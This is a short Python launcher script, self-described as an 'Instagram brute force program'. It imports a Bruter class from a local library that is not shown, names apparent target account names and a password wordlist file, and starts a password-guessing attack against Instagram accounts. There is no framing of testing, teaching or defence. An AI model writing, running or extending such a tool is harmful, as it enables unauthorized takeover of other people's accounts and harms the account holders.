# Date: 06/09/2019
# Author: Mohamed
# Description: Instagram brute force program

from lib.bruter import Bruter


if __name__ == '__main__':
    b = Bruter('Sa@9dsa', 'pass2.lst')
    # b = Bruter('Sami09.2', 'pass2.lst')
    b.start()
